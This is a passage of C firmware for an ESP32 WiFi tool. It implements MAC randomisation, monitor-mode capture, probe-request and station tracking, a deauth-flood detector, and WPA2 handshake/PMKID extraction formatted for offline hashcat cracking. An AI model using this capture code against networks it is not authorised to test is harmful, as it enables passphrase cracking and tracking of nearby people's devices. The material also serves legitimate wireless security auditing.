    nocsif_settings_set_str(K_SSID, "");
    nocsif_settings_set_str(K_PASS, "");
    ESP_LOGI(TAG, "saved network forgotten");
    do_disconnect();
}

static void do_connect_saved(const char *ssid)
{
    for (int i = 0; i < s_sv_cnt; i++) {
        if (strcmp(s_sv_ssid[i], ssid) == 0) {
            do_connect(s_sv_ssid[i], s_sv_pass[i]);   /* stored passphrase, no prompt */
            return;
        }
    }
    ESP_LOGW(TAG, "connect_saved: \"%s\" not saved", ssid ? ssid : "");
}

static void do_forget_ssid(const char *ssid)
{
    if (ssid == NULL || ssid[0] == '\0') {
        return;
    }
    remove_saved(ssid);
    if (strcmp(s_ssid, ssid) == 0) {   /* forgetting the active/primary net: clear it + drop link */
        s_ssid[0] = '\0';
        s_pass[0] = '\0';
        nocsif_settings_set_str(K_SSID, "");
        nocsif_settings_set_str(K_PASS, "");
        do_disconnect();
    }
    ESP_LOGI(TAG, "forgot \"%s\" (saved=%d)", ssid, s_sv_cnt);
}

/* Re-join the already-saved network (creds are in s_ssid/s_pass from the RAM cache). Forces a
 * connect regardless of s_autojoin — this runs only on an explicit tap. */
static void do_reconnect(void)
{
    if (s_ssid[0] == '\0') {
        return;                 /* nothing saved to reconnect to */
    }
    if (!bring_up()) {
        return;
    }
    if (s_ap_active) { ap_teardown(); }   /* single radio: a reconnect ends the AP */
    s_enabled = true;
    s_want_connect = true;
    s_retry = 0;
    s_auth_fail = false;
    s_join_state = NOCSIF_WIFI_JOIN_JOINING;
    apply_config();
    if (!ensure_started()) {
        return;
    }
    if (s_sta_started && !s_connected) {
        try_connect();          /* started + idle -> connect now; else STA_START will */
    }
    refresh_strings();
}

/* Apply a station MAC. esp_wifi_set_mac requires the interface stopped, so a live link is
 * dropped, the MAC set, and the radio restarted (STA_START re-joins if s_want_connect). */
static void apply_mac(const uint8_t mac[6])
{
    if (!bring_up()) {
        return;
    }
    bool restart = s_sta_started;
    if (restart) {
        esp_wifi_stop();        /* synchronous stop; STA_STOP event follows */
        s_sta_started = false;  /* reflect it now so ensure_started() actually restarts */
        s_connected = false;
        clear_netinfo();
    }
    esp_err_t e = esp_wifi_set_mac(WIFI_IF_STA, mac);
    if (e != ESP_OK) {
        ESP_LOGW(TAG, "esp_wifi_set_mac: %s", esp_err_to_name(e));
    } else {
        ESP_LOGI(TAG, "STA MAC set to %02x:%02x:%02x:%02x:%02x:%02x",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    }
    publish_current_mac();      /* reflect whatever actually took */
    if (restart) {
        ensure_started();       /* STA_START -> try_connect() if we still want a link */
    }
    refresh_strings();
}

static void do_randmac(void)
{
    uint8_t mac[6];
    esp_fill_random(mac, sizeof mac);
    mac[0] = (mac[0] & 0xFE) | 0x02;   /* unicast (bit0=0) + locally administered (bit1=1) */
    apply_mac(mac);
}

static void do_restmac(void)
{
    if (s_mac_factory_ok) {
        apply_mac(s_mac_factory);
    }
}

/* Apply a renamed hostname. If we're associated, bounce the link so the new name goes out in a
 * fresh DHCP request; if idle, just set it for the next connect. */
static void do_apply_host(void)
{
    if (!s_driver_up) {
        return;                 /* bring_up() will apply it on first use */
    }
    apply_hostname();
    if (s_connected && s_want_connect) {
        esp_wifi_disconnect();  /* reconnect handler re-associates -> new DHCP with the new name */
    }
}

/* ---- monitor / promiscuous capture (M5-P2) ---------------------------------------- */

/* Promiscuous rx callback — runs in the WiFi task context on EVERY captured frame, so it is
 * strictly O(1), allocation-free and log-free: it only bumps volatile tallies (single writer,
 * so lock-free for the UI readers). No frame is stored and no SSID is parsed (that is P3). */
/* If `d` (a data frame, `len` bytes on air) carries an EAPOL payload — LLC/SNAP with ethertype
 * 0x888e — return the byte offset of the EAPOL header (just past the SNAP); else 0. Accounts for
 * the optional QoS control + a 4-address (WDS) header, and rejects protected frames (an installed
 * key ciphers the SNAP, so it cannot be read). Cheap + O(1): non-data and protected frames bail in
 * the first two bytes, so the bulk of (encrypted) traffic short-circuits immediately. */
static int eapol_offset(const uint8_t *d, int len)
{
    if (len < 4)                     return 0;
    if (((d[0] >> 2) & 0x3) != 2)    return 0;        /* data frames only                 */
    if (d[1] & 0x40)                 return 0;        /* protected: SNAP is ciphered      */
    uint8_t fsub   = (d[0] >> 4) & 0xF;
    bool    tods   = (d[1] & 0x01) != 0;
    bool    fromds = (d[1] & 0x02) != 0;
    int hdr = 24;
    if (tods && fromds) hdr += 6;                     /* 4-address (WDS) header           */
    if (fsub & 0x08)    hdr += 2;                     /* QoS control                      */
    if (hdr + 8 > len)  return 0;
    if (d[hdr] != 0xAA || d[hdr + 1] != 0xAA || d[hdr + 2] != 0x03)      return 0;  /* LLC   */
    if (d[hdr + 3] || d[hdr + 4] || d[hdr + 5])                         return 0;  /* OUI 0 */
    if (d[hdr + 6] != 0x88 || d[hdr + 7] != 0x8E)                       return 0;  /* 0x888e */
    return hdr + 8;                                    /* EAPOL header offset              */
}

/* Predicate for the EAPOL-filtered PCAP session (M5-P4·1): keep only EAPOL data frames + the
 * beacon / probe-response that names the network (hcxtools needs the ESSID to recover a key). In
 * the FULL session every frame is kept (P3·3). Runs in the rx hot path, so it stays O(1). */
static bool pcap_frame_wanted(const uint8_t *d, int len, wifi_promiscuous_pkt_type_t type)
{
    if (s_pcap_filter == PCAP_FILTER_FULL) return true;
    if (type == WIFI_PKT_DATA)             return eapol_offset(d, len) != 0;
    if (type == WIFI_PKT_MGMT && len >= 1) {
        uint8_t fsub = (d[0] >> 4) & 0xF;
        return fsub == 8 || fsub == 5;                /* beacon(8) / probe-response(5)    */
    }
    return false;
}

static void on_promiscuous(void *buf, wifi_promiscuous_pkt_type_t type)
{
    s_mon_total++;
    nocsif_wifi_pkt_kind_t k;
    switch (type) {
        case WIFI_PKT_MGMT: k = NOCSIF_WIFI_PKT_MGMT; break;
        case WIFI_PKT_CTRL: k = NOCSIF_WIFI_PKT_CTRL; break;
        case WIFI_PKT_DATA: k = NOCSIF_WIFI_PKT_DATA; break;
        default:            k = NOCSIF_WIFI_PKT_MISC; break;
    }
    s_mon_by_type[k]++;

    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
    if (p) {
        int ch = p->rx_ctrl.channel;                  /* attribute to the frame's own channel */
        if (ch >= 1 && ch <= 13) {
            s_mon_ch[ch]++;
        }
        int8_t r = (int8_t)p->rx_ctrl.rssi;
        s_mon_rssi_last = r;
        if (r > s_mon_rssi_peak) {
            s_mon_rssi_peak = r;
        }
        /* Deauth/disassoc rate detector (M5-P4·2): a cheap subtype peek on management frames. A
         * sustained elevated rate is the signature of a deauthentication / disassociation flood. */
        if (type == WIFI_PKT_MGMT && p->rx_ctrl.sig_len >= 1) {
            uint8_t fsub = (p->payload[0] >> 4) & 0xF;
            if      (fsub == 12) s_mon_deauth++;
            else if (fsub == 10) s_mon_disassoc++;
        }
    }

    /* Copy-out for the passive parser (M5-P3): management frames carry AP + probe-request
     * identity (full early-IE snaplen); data frames map a client to its AP (only the MAC header
     * is needed, so a short snaplen keeps the ring light against the bulk of the traffic). A
     * bounded memcpy into the SPSC PSRAM ring; drop (counted) when full so the radio is never
     * blocked. Release-store the tail so the filled slot is visible to the parser before the
     * publish. (PCAP export runs its own separate all-frames ring.) */
    if (s_parse_active && s_ring && p && (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA)) {
        uint32_t tail = s_ring_tail;                                    /* sole producer */
        uint32_t head = __atomic_load_n(&s_ring_head, __ATOMIC_ACQUIRE);
        if ((tail - head) >= CAP_SLOTS) {
            s_ring_drop++;                                              /* ring full */
        } else {
            cap_slot_t *slot = &s_ring[tail & (CAP_SLOTS - 1)];
            uint16_t len  = p->rx_ctrl.sig_len;
            /* Data frames need only the MAC header for the station map (short snaplen), EXCEPT an
             * EAPOL frame, which is copied in full so the parser can read the key exchange + PMKID. */
            uint16_t snap = CAP_SNAP;
            if (type == WIFI_PKT_DATA) {
                snap = eapol_offset(p->payload, len) ? CAP_SNAP : CAP_SNAP_DATA;
            }
            uint16_t cap  = len > snap ? snap : len;
            slot->ts_us    = esp_timer_get_time();
            slot->rssi     = (int8_t)p->rx_ctrl.rssi;
            slot->channel  = (uint8_t)p->rx_ctrl.channel;
            slot->pkt_type = (uint8_t)type;
            slot->orig_len = len;
            slot->cap_len  = cap;
            memcpy(slot->data, p->payload, cap);
            __atomic_store_n(&s_ring_tail, tail + 1, __ATOMIC_RELEASE);
        }
    }

    /* Copy-out for PCAP (M5-P3·3): ALL frame types, larger snaplen, into the separate PCAP ring.
     * Same O(1) drop-on-full discipline; the big-stack writer task does the SD I/O, never here. An
     * EAPOL-filtered session (M5-P4·1) keeps only the key-exchange + naming frames. */
    if (s_pcap_active && s_pcap_ring && p &&
        pcap_frame_wanted(p->payload, p->rx_ctrl.sig_len, type)) {
        uint32_t tail = s_pcap_tail;                                    /* sole producer */
        uint32_t head = __atomic_load_n(&s_pcap_head, __ATOMIC_ACQUIRE);
        if ((tail - head) >= PCAP_SLOTS) {
            s_pcap_drop++;                                              /* ring full */
        } else {
            pcap_slot_t *slot = &s_pcap_ring[tail & (PCAP_SLOTS - 1)];
            uint16_t len = p->rx_ctrl.sig_len;
            uint16_t cap = len > PCAP_SNAP ? PCAP_SNAP : len;
            slot->ts_us    = esp_timer_get_time();
            slot->rssi     = (int8_t)p->rx_ctrl.rssi;
            slot->channel  = (uint8_t)p->rx_ctrl.channel;
            slot->orig_len = len;
            slot->cap_len  = cap;
            memcpy(slot->data, p->payload, cap);
            __atomic_store_n(&s_pcap_tail, tail + 1, __ATOMIC_RELEASE);
        }
    }
}

/* Periodic tick (esp_timer task — off the LVGL task): hop the channel while hopping, and
 * recompute the frame rate over the actual elapsed window (~1 s). */
static void mon_tick(void *arg)
{
    (void)arg;
    if (!s_mon_active) {
        return;                                       /* teardown flipped this; bail */
    }
    if (s_mon_hop) {
        int ch = s_mon_chan + 1;
        if (ch > 13) {
            ch = 1;
        }
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        s_mon_chan = ch;
    }
    int64_t now = esp_timer_get_time();
    int64_t dt = now - s_mon_rate_t0;
    if (dt >= 1000000) {                              /* ~1 s window */
        uint32_t total = s_mon_total;
        s_mon_rate = (uint32_t)((int64_t)(total - s_mon_rate_base) * 1000000 / dt);
        s_mon_rate_base = total;
        uint32_t dd = s_mon_deauth + s_mon_disassoc;  /* deauth+disassoc rate over the same window */
        s_mon_dd_rate = (uint32_t)((int64_t)(dd - s_mon_dd_base) * 1000000 / dt);
        s_mon_dd_base = dd;
        if (s_mon_dd_rate > s_mon_dd_peak) s_mon_dd_peak = s_mon_dd_rate;
        s_mon_rate_t0 = now;
    }
}

/* Install capture: drop any STA link (single radio -> free it to hop), set the frame filter +
 * rx callback, enter promiscuous, and start the hop/sample timer. Called on the worker when the
 * STA is already started, or from the STA_START event when the radio had to be powered up first. */
static void enter_promiscuous(void)
{
    s_mon_prev_connected = s_connected;               /* remember what to restore on exit */

    s_want_connect = false;                           /* the disconnect handler must not retry */
    if (s_connected || s_sta_started) {
        esp_wifi_disconnect();
    }
    s_connected = false;
    s_join_state = NOCSIF_WIFI_JOIN_IDLE;
    clear_netinfo();

    s_mon_total = 0;
    for (int i = 0; i < NOCSIF_WIFI_PKT_KINDS; i++) {
        s_mon_by_type[i] = 0;
    }
    for (int i = 0; i < 14; i++) {
        s_mon_ch[i] = 0;
    }
    s_mon_rate = 0;
    s_mon_rssi_last = 0;
    s_mon_rssi_peak = -127;
    s_mon_rate_base = 0;
    s_mon_rate_t0 = esp_timer_get_time();
    s_mon_deauth = s_mon_disassoc = s_mon_dd_rate = s_mon_dd_peak = s_mon_dd_base = 0;

    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                       WIFI_PROMIS_FILTER_MASK_CTRL |
                       WIFI_PROMIS_FILTER_MASK_DATA,
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(on_promiscuous);
    esp_err_t e = esp_wifi_set_promiscuous(true);
    if (e != ESP_OK) {
        ESP_LOGE(TAG, "set_promiscuous(true): %s", esp_err_to_name(e));
        publish_status("err");
        publish_detail("Monitor failed to start.");
        return;
    }
    if (s_mon_chan < 1 || s_mon_chan > 13) {
        s_mon_chan = 1;
    }
    esp_wifi_set_channel(s_mon_chan, WIFI_SECOND_CHAN_NONE);

    if (s_mon_timer == NULL) {
        const esp_timer_create_args_t ta = { .callback = mon_tick, .name = "wifimon" };
        ESP_ERROR_CHECK_WITHOUT_ABORT(esp_timer_create(&ta, &s_mon_timer));
    }
    if (s_mon_timer) {
        esp_timer_start_periodic(s_mon_timer, 250000);   /* 250 ms channel dwell */
    }
    s_mon_active = true;
    ESP_LOGI(TAG, "monitor on (mgmt|ctrl|data, %s); int-dma free=%u largest=%u",
             s_mon_hop ? "hop 1-13" : "lock",
             (unsigned)nocsif_int_dma_free(),
             (unsigned)nocsif_int_dma_largest());
    refresh_strings();
}

/* Stop capture but DO NOT restore the STA link (shared by monitor-off and radio-disable). */
static void monitor_teardown(void)
{
    s_pending_monitor = false;
    s_parse_active = false;                           /* no capture -> stop parsing (ring/task kept) */
    do_mgmt_tx_off();                                 /* no capture -> stop any management-frame TX  */
    do_beacon_off();                                  /* no capture -> stop any beacon TX            */
    pcap_stop_and_free();                             /* no capture -> stop PCAP + free the writer task */
    if (!s_mon_active) {
        return;
    }
    if (s_mon_timer) {
        esp_timer_stop(s_mon_timer);                  /* no more hops / samples */
    }
    s_mon_active = false;                             /* the tick bails on this */
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    ESP_LOGI(TAG, "monitor off (captured %u frames)", (unsigned)s_mon_total);
}

/* ---- passive parser: decode captured management frames into the nearby-AP table (M5-P3) --- */

/* A small curated OUI -> vendor table (common consumer / infrastructure makers). NOT exhaustive
 * — a best-effort label for the list; unknown OUIs show "" and a randomized MAC shows "random".
 * (An SD-backed full OUI database can replace this later.) First 3 BSSID bytes, big-endian. */
static const struct { uint8_t oui[3]; const char *name; } k_oui[] = {
    { {0x24,0x0A,0xC4}, "Espressif" }, { {0x24,0x6F,0x28}, "Espressif" }, { {0x30,0xAE,0xA4}, "Espressif" },
    { {0xA4,0xCF,0x12}, "Espressif" }, { {0x84,0xF3,0xEB}, "Espressif" }, { {0xEC,0xFA,0xBC}, "Espressif" },
    { {0x3C,0x07,0x54}, "Apple" },     { {0xA4,0x83,0xE7}, "Apple" },     { {0xF0,0x18,0x98}, "Apple" },
    { {0xDC,0xA9,0x04}, "Apple" },     { {0xAC,0xBC,0x32}, "Apple" },
    { {0x50,0xC7,0xBF}, "TP-Link" },   { {0xEC,0x08,0x6B}, "TP-Link" },   { {0x60,0x32,0xB1}, "TP-Link" },
    { {0x20,0xE5,0x2A}, "Netgear" },   { {0xA0,0x40,0xA0}, "Netgear" },   { {0x9C,0xD3,0x6D}, "Netgear" },
    { {0x24,0xA4,0x3C}, "Ubiquiti" },  { {0x78,0x8A,0x20}, "Ubiquiti" },  { {0xFC,0xEC,0xDA}, "Ubiquiti" },
    { {0x3C,0x5A,0xB4}, "Google" },    { {0x54,0x60,0x09}, "Google" },    { {0xDA,0xA1,0x19}, "Google" },
    { {0x44,0x65,0x0D}, "Amazon" },    { {0xFC,0x65,0xDE}, "Amazon" },    { {0x68,0x37,0xE9}, "Amazon" },
    { {0x4C,0x5E,0x0C}, "MikroTik" },  { {0x64,0xD1,0x54}, "MikroTik" },  { {0xDC,0x2C,0x6E}, "MikroTik" },
    { {0x64,0x09,0x80}, "Xiaomi" },    { {0x28,0x6C,0x07}, "Xiaomi" },
    { {0x00,0xE0,0xFC}, "Huawei" },    { {0x48,0x46,0xFB}, "Huawei" },
    { {0x2C,0x56,0xDC}, "ASUS" },      { {0x1C,0xB7,0x2C}, "ASUS" },
    { {0x1C,0xBD,0xB9}, "D-Link" },    { {0xC8,0xD3,0xA3}, "D-Link" },
    { {0x5C,0x0A,0x5B}, "Samsung" },   { {0x8C,0x77,0x12}, "Samsung" },
    { {0x00,0x0B,0x86}, "Aruba" },     { {0x6C,0xF3,0x7F}, "Aruba" },
    { {0x00,0x18,0x0A}, "Meraki" },    { {0xE0,0xCB,0xBC}, "Meraki" },
};

/* Vendor label for a BSSID. A locally-administered address (bit1 of octet 0) is a randomized MAC
 * — flag it as "random" (a useful signal), never a vendor. Writes a NUL-terminated `out`. */
static void oui_lookup(const uint8_t bssid[6], char *out, size_t outlen)
{
    if (bssid[0] & 0x02) { snprintf(out, outlen, "random"); return; }
    for (size_t i = 0; i < sizeof(k_oui) / sizeof(k_oui[0]); i++) {
        if (k_oui[i].oui[0] == bssid[0] && k_oui[i].oui[1] == bssid[1] && k_oui[i].oui[2] == bssid[2]) {
            snprintf(out, outlen, "%s", k_oui[i].name);
            return;
        }
    }
    out[0] = '\0';
}

/* Classify an RSN IE body (after tag+len): version(2) group(4) pairwise{cnt(2),list} akm{cnt(2),
 * list} ... Scan the AKM suites for SAE (WPA3) or 802.1X/EAP (enterprise); default WPA2-PSK.
 * Every offset is bounds-checked against `len` (the IE may be truncated by the snaplen). */
static uint8_t classify_rsn(const uint8_t *ie, int len)
{
    int off = 2;                                   /* skip version */
    if (off + 4 > len) return NOCSIF_WIFI_SEC_WPA2;
    off += 4;                                      /* group cipher suite */
    if (off + 2 > len) return NOCSIF_WIFI_SEC_WPA2;
    int pc = ie[off] | (ie[off + 1] << 8);         /* pairwise count */
    off += 2 + pc * 4;
    if (off + 2 > len) return NOCSIF_WIFI_SEC_WPA2;
    int ac = ie[off] | (ie[off + 1] << 8);         /* AKM count */
    off += 2;
    bool sae = false, ent = false;
    for (int i = 0; i < ac; i++) {
        if (off + 4 > len) break;
        if (ie[off] == 0x00 && ie[off + 1] == 0x0F && ie[off + 2] == 0xAC) {   /* 00-0F-AC family */
            uint8_t t = ie[off + 3];
            if (t == 8 || t == 9)                                  sae = true;  /* SAE / SAE-FT */
            else if (t == 1 || t == 3 || t == 5 || t == 11 || t == 12) ent = true;  /* 802.1X/EAP */
        }
        off += 4;
    }
    if (sae) return NOCSIF_WIFI_SEC_WPA3;
    if (ent) return NOCSIF_WIFI_SEC_WPA2E;
    return NOCSIF_WIFI_SEC_WPA2;
}

/* Insert or update one AP in the table (parser task). First-seen order keeps rows stable; when
 * the table is full the stalest entry is evicted. Formatting is done before the lock; the short
 * spinlock only touches the table so the LVGL reader is never blocked long. */
static void ap_upsert(const uint8_t bssid[6], const char *ssid, bool hidden,
                      uint8_t channel, int8_t rssi, uint8_t sec, int64_t ts)
{
    char vendor[12];
    oui_lookup(bssid, vendor, sizeof vendor);

    portENTER_CRITICAL(&s_ap_mux);
    int idx = -1;
    for (int i = 0; i < s_mon_ap_cnt; i++) {
        if (s_mon_ap[i].used && memcmp(s_mon_ap[i].bssid, bssid, 6) == 0) { idx = i; break; }
    }
    bool structural = false;
    if (idx < 0) {
        if (s_mon_ap_cnt < MON_AP_MAX) {
            idx = s_mon_ap_cnt++;
        } else {                                    /* evict the stalest */
            idx = 0;
            int64_t oldest = s_mon_ap[0].last_us;
            for (int i = 1; i < MON_AP_MAX; i++) {
                if (s_mon_ap[i].last_us < oldest) { oldest = s_mon_ap[i].last_us; idx = i; }
            }
        }
        mon_ap_t *n = &s_mon_ap[idx];
        n->used = true;
        memcpy(n->bssid, bssid, 6);
        n->ssid[0] = '\0';
        n->frames  = 0;
        structural = true;
    }
    mon_ap_t *a = &s_mon_ap[idx];
    if (!hidden && ssid[0]) {                        /* reveal / refresh SSID; keep a known one */
        size_t k = 0;
        while (ssid[k] && k < sizeof(a->ssid) - 1) { a->ssid[k] = ssid[k]; k++; }
        a->ssid[k] = '\0';
    }
    a->channel = channel;
    a->rssi    = rssi;
    a->sec     = sec;
    if (a->frames < 0xFFFF) a->frames++;
    a->last_us = ts;
    memcpy(a->vendor, vendor, sizeof a->vendor);
    if (structural) s_mon_ap_gen++;
    portEXIT_CRITICAL(&s_ap_mux);
}

/* Insert or update one station in the table (parser task). Same first-seen / stalest-evict shape
 * as ap_upsert; the short spinlock only touches the table. */
static void sta_upsert(const uint8_t mac[6], const uint8_t bssid[6],
                       uint8_t channel, int8_t rssi, int64_t ts)
{
    char vendor[12];
    oui_lookup(mac, vendor, sizeof vendor);

    portENTER_CRITICAL(&s_ap_mux);
    int idx = -1;
    for (int i = 0; i < s_mon_sta_cnt; i++) {
        if (s_mon_sta[i].used && memcmp(s_mon_sta[i].mac, mac, 6) == 0) { idx = i; break; }
    }
    bool structural = false;
    if (idx < 0) {
        if (s_mon_sta_cnt < MON_STA_MAX) {
            idx = s_mon_sta_cnt++;
        } else {                                    /* evict the stalest */
            idx = 0;
            int64_t oldest = s_mon_sta[0].last_us;
            for (int i = 1; i < MON_STA_MAX; i++) {
                if (s_mon_sta[i].last_us < oldest) { oldest = s_mon_sta[i].last_us; idx = i; }
            }
        }
        mon_sta_t *n = &s_mon_sta[idx];
        n->used = true;
        memcpy(n->mac, mac, 6);
        n->frames = 0;
        structural = true;
    }
    mon_sta_t *st = &s_mon_sta[idx];
    if (bssid) memcpy(st->bssid, bssid, 6);
    st->channel = channel;
    st->rssi    = rssi;
    if (st->frames < 0xFFFF) st->frames++;
    st->last_us = ts;
    memcpy(st->vendor, vendor, sizeof st->vendor);
    if (structural) s_mon_sta_gen++;
    portEXIT_CRITICAL(&s_ap_mux);
}

/* Insert or update one probe request, keyed by the (device, requested-SSID) pair. */
static void probe_upsert(const uint8_t mac[6], const char *ssid, int8_t rssi, int64_t ts)
{
    char vendor[12];
    oui_lookup(mac, vendor, sizeof vendor);

    portENTER_CRITICAL(&s_ap_mux);
    int idx = -1;
    for (int i = 0; i < s_mon_probe_cnt; i++) {
        if (s_mon_probe[i].used && memcmp(s_mon_probe[i].mac, mac, 6) == 0 &&
            strcmp(s_mon_probe[i].ssid, ssid) == 0) { idx = i; break; }
    }
    bool structural = false;
    if (idx < 0) {
        if (s_mon_probe_cnt < MON_PROBE_MAX) {
            idx = s_mon_probe_cnt++;
        } else {                                    /* evict the stalest */
            idx = 0;
            int64_t oldest = s_mon_probe[0].last_us;
            for (int i = 1; i < MON_PROBE_MAX; i++) {
                if (s_mon_probe[i].last_us < oldest) { oldest = s_mon_probe[i].last_us; idx = i; }
            }
        }
        mon_probe_t *n = &s_mon_probe[idx];
        n->used = true;
        memcpy(n->mac, mac, 6);
        snprintf(n->ssid, sizeof n->ssid, "%s", ssid);
        n->count = 0;
        structural = true;
    }
    mon_probe_t *pr = &s_mon_probe[idx];
    pr->rssi = rssi;
    if (pr->count < 0xFFFF) pr->count++;
    pr->last_us = ts;
    memcpy(pr->vendor, vendor, sizeof pr->vendor);
    if (structural) s_mon_probe_gen++;
    portEXIT_CRITICAL(&s_ap_mux);
}

/* Map a data frame to a (station, AP) pair from the ToDS/FromDS bits + addresses, and record the
 * station. Only infrastructure frames (exactly one of ToDS/FromDS) resolve an AP; IBSS/WDS are
 * skipped. Group/broadcast senders and the AP's own address are never recorded as a station. */
static void parse_data_frame(const cap_slot_t *s, const uint8_t *d)
{
    if (s->cap_len < 24) {                          /* need the 3-address MAC header */
        return;
    }
    bool tods   = (d[1] & 0x01) != 0;
    bool fromds = (d[1] & 0x02) != 0;
    const uint8_t *a1 = d + 4, *a2 = d + 10;
    const uint8_t *sta, *bssid;
    if (tods && !fromds)      { bssid = a1; sta = a2; }   /* station -> AP: addr2 is the client */
    else if (!tods && fromds) { sta = a1; bssid = a2; }   /* AP -> station: addr1 is the client */
    else                      { return; }                 /* IBSS / WDS: no infra AP mapping    */

    if (sta[0] & 0x01)              return;         /* group/broadcast sender — not a station */
    bool allzero = true;
    for (int i = 0; i < 6; i++) { if (sta[i]) { allzero = false; break; } }
    if (allzero)                   return;
    if (memcmp(sta, bssid, 6) == 0) return;         /* the AP itself is not a station         */

    sta_upsert(sta, bssid, s->channel, s->rssi, s->ts_us);
}

/* Decode a probe request (management subtype 4): addr2 is the searching device; the first IE
 * (tag 0) is the SSID it is looking for (empty = a broadcast/wildcard probe). */
static void parse_probe_req(const cap_slot_t *s, const uint8_t *d)
{
    if (s->cap_len < 24) {
        return;
    }
    const uint8_t *sa = d + 10;                     /* addr2 = source (the device) */
    if (sa[0] & 0x01) {                             /* group source shouldn't occur — skip */
        return;
    }
    char ssid[WIFI_SSID_MAX]; ssid[0] = '\0';
    int len = s->cap_len;
    int off = 24;                                   /* probe-request IEs start right after the header */
    while (off + 2 <= len) {
        uint8_t tag  = d[off];
        uint8_t tlen = d[off + 1];
        if (off + 2 + tlen > len) break;            /* truncated by snaplen — stop */
        if (tag == 0) {                             /* SSID (the first IE) */
            int n = tlen > 32 ? 32 : tlen;
            bool allzero = true;
            for (int i = 0; i < n; i++) { if (d[off + 2 + i]) { allzero = false; break; } }
            if (n > 0 && !allzero) {
                for (int i = 0; i < n; i++) {        /* sanitize to the font's printable range */
                    uint8_t c = d[off + 2 + i];
                    ssid[i] = (c >= 0x20 && c < 0x7F) ? (char)c : '?';
                }
                ssid[n] = '\0';
            }
            break;                                  /* SSID handled; the rest is rates/etc. */
        }
        off += 2 + tlen;
    }
    probe_upsert(sa, ssid, s->rssi, s->ts_us);
}

/* Insert or update one BSSID's key-exchange record (parser task). Same first-seen / stalest-evict
 * shape as ap_upsert; a PMKID, once seen, is kept. */
/* One decoded EAPOL message, handed to hs_upsert (which merges it into the BSSID's table entry). */
typedef struct {
    uint8_t bssid[6];
    uint8_t sta[6];   bool have_sta;
    uint8_t msg;                              /* 1..4 */
    bool    have_pmkid;  uint8_t pmkid[16];   /* from message 1 */
    bool    have_anonce; uint8_t anonce[32];  /* from message 1 */
    bool    have_mic;    uint8_t mic[16];     /* from message 2 */
    uint8_t eapol[HS_EAPOL_MAX];              /* message-2 EAPOL frame (MIC zeroed) */
    uint8_t eapol_len;
    int8_t  rssi;  int64_t ts;
} eapol_parsed_t;

static void hs_upsert(const eapol_parsed_t *p)
{
    char vendor[12];
    oui_lookup(p->bssid, vendor, sizeof vendor);

    portENTER_CRITICAL(&s_ap_mux);
    int idx = -1;
    for (int i = 0; i < s_mon_hs_cnt; i++) {
        if (s_mon_hs[i].used && memcmp(s_mon_hs[i].bssid, p->bssid, 6) == 0) { idx = i; break; }
    }
    bool structural = false;
    if (idx < 0) {
        if (s_mon_hs_cnt < MON_HS_MAX) {
            idx = s_mon_hs_cnt++;
        } else {                                    /* evict the stalest */
            idx = 0;
            int64_t oldest = s_mon_hs[0].last_us;
            for (int i = 1; i < MON_HS_MAX; i++) {
                if (s_mon_hs[i].last_us < oldest) { oldest = s_mon_hs[i].last_us; idx = i; }
            }
        }
        mon_hs_t *n = &s_mon_hs[idx];
        memset(n, 0, sizeof *n);                     /* fresh BSSID: clear every field */
        n->used = true;
        memcpy(n->bssid, p->bssid, 6);
        structural = true;
    }
    mon_hs_t *h = &s_mon_hs[idx];
    if (p->msg >= 1 && p->msg <= 4) h->msg_mask |= (uint8_t)(1u << (p->msg - 1));
    if (p->have_sta    && !h->have_sta)    { memcpy(h->sta, p->sta, 6);        h->have_sta = true; }
    if (p->have_pmkid  && !h->has_pmkid)   { memcpy(h->pmkid, p->pmkid, 16);   h->has_pmkid = true; }
    if (p->have_anonce && !h->have_anonce) { memcpy(h->anonce, p->anonce, 32); h->have_anonce = true; }
    if (p->have_mic    && !h->have_mic && p->eapol_len > 0) {
        memcpy(h->mic, p->mic, 16);
        memcpy(h->eapol, p->eapol, p->eapol_len);
        h->eapol_len = p->eapol_len;
        h->have_mic = true;
    }
    h->rssi = p->rssi;
    if (h->frames < 0xFFFF) h->frames++;
    h->last_us = p->ts;
    memcpy(h->vendor, vendor, sizeof h->vendor);
    if (structural) s_mon_hs_gen++;
    portEXIT_CRITICAL(&s_ap_mux);
}

/* Decode an EAPOL-Key frame (`eo` = the EAPOL header offset within the data frame `d`). Classify
 * which of the 4-way messages it is from the key-info bits; capture the PMKID + ANonce from message
 * 1 and the MIC + raw EAPOL bytes from message 2 (what a hashcat-22000 line needs), keyed by BSSID.
 * All offsets are bounds-checked against cap_len — a frame truncated by the snaplen yields fewer
 * fields. Purely observational.
 *
 * EAPOL-Key body (from `kf`): descriptor(1) info(2) keylen(2) replay(8) nonce(32) iv(16) rsc(8)
 * reserved(8) mic(16) key-data-len(2) key-data(var) — so nonce is kf+13, MIC kf+77, key-data-len
 * kf+93 for the common 16-byte-MIC AKMs (WPA2-PSK); a longer-MIC AKM just yields fewer fields. */
static void parse_eapol(const cap_slot_t *s, const uint8_t *d, int eo)
{
    int len = s->cap_len;
    if (eo + 4 > len)     return;
    if (d[eo + 1] != 3)   return;                    /* EAPOL packet type 3 = EAPOL-Key */
    int kf = eo + 4;                                 /* key-frame body starts here      */
    if (kf + 3 > len)     return;
    uint16_t info = (uint16_t)((d[kf + 1] << 8) | d[kf + 2]);   /* key info (BE) */
    bool ack     = (info & 0x0080) != 0;
    bool mic     = (info & 0x0100) != 0;
    bool secure  = (info & 0x0200) != 0;
    bool install = (info & 0x0040) != 0;

    uint8_t msg = 0;
    if      ( ack && !mic)             msg = 1;      /* AP→STA, carries ANonce (+ maybe PMKID) */
    else if (!ack &&  mic && !secure)  msg = 2;      /* STA→AP, carries SNonce + MIC           */
    else if ( ack &&  mic &&  install) msg = 3;      /* AP→STA                                 */
    else if (!ack &&  mic &&  secure)  msg = 4;      /* STA→AP                                 */
    if (msg == 0) return;                            /* group-key rekey / unknown — ignore     */

    /* The AP's address depends on direction: msg1/3 are AP→STA, msg2/4 are STA→AP. */
    bool tods   = (d[1] & 0x01) != 0;
    bool fromds = (d[1] & 0x02) != 0;
    const uint8_t *bssid, *sta;
